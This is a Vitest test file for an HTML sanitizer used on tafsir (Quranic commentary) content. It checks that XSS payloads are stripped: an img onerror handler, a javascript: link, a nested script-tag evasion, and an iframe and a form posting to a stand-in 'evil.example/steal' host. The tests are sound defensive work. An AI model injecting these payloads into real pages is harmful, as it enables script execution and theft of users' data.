import { describe, expect, it } from "vitest";
import { sanitizeTafsirHtml } from "./sanitize-html";

describe("sanitizeTafsirHtml", () => {
  it("strips an <img onerror> payload entirely", () => {
    const out = sanitizeTafsirHtml('<p>before</p><img src=x onerror=alert(1)><p>after</p>');
    expect(out).not.toContain("onerror");
    expect(out).not.toContain("<img");
    expect(out).toContain("<p>before</p>");
    expect(out).toContain("<p>after</p>");
  });

  it("strips an <iframe> and its contents", () => {
    const out = sanitizeTafsirHtml('<p>ok</p><iframe src="https://evil.example">trapped</iframe>');
    expect(out).not.toContain("<iframe");
    expect(out).not.toContain("evil.example");
    expect(out).not.toContain("trapped");
    expect(out).toContain("<p>ok</p>");
  });

  it("strips a javascript: href but keeps the link text", () => {
    const out = sanitizeTafsirHtml('<p>see <a href="javascript:alert(1)">this</a></p>');
    expect(out).not.toContain("javascript:");
    expect(out).not.toContain("<a ");
    expect(out).toContain("this");
  });

  it("strips a <form action> and its contents", () => {
    const out = sanitizeTafsirHtml(
      '<p>ok</p><form action="https://evil.example/steal"><input name="x"></form>',
    );
    expect(out).not.toContain("<form");
    expect(out).not.toContain("evil.example");
    expect(out).toContain("<p>ok</p>");
  });

  it("resists a nested <scr<script>ipt> evasion", () => {
    // A real parser (unlike the removed regex) never assembles this into a
    // functioning <script> element — "alert(1)" may survive as inert TEXT
    // (safe: not inside a script tag, no event handler, no javascript: URL),
    // but no executable <script ...> tag may reach the output.
    const out = sanitizeTafsirHtml("<p>ok</p><scr<script>ipt>alert(1)</scr</script>ipt>");
    expect(out.toLowerCase()).not.toMatch(/<script[\s>]/);
    expect(out).toContain("<p>ok</p>");
  });

  it("keeps benign prose markup intact", () => {
    const out = sanitizeTafsirHtml(
      "<p>This is <em>emphasis</em> and <strong>strong</strong>, plus a list:</p>" +
        "<ul><li>one</li><li>two</li></ul><blockquote>quoted</blockquote>",
    );
    expect(out).toBe(
      "<p>This is <em>emphasis</em> and <strong>strong</strong>, plus a list:</p>" +
        "<ul><li>one</li><li>two</li></ul><blockquote>quoted</blockquote>",
    );
  });

  it("keeps Arabic text with diacritics byte-for-byte", () => {
    // Copied verbatim from packages/api/src/services/quran.service.test.ts
    // getTafsir fixtures — never retype Uthmani/Arabic literals by hand.
    const arabic = "<p>تفسير</p>";
    expect(sanitizeTafsirHtml(arabic)).toBe(arabic);
  });

  it("strips attributes even from allowed tags", () => {
    const out = sanitizeTafsirHtml('<p style="color:red" onclick="alert(1)">text</p>');
    expect(out).toBe("<p>text</p>");
  });
});
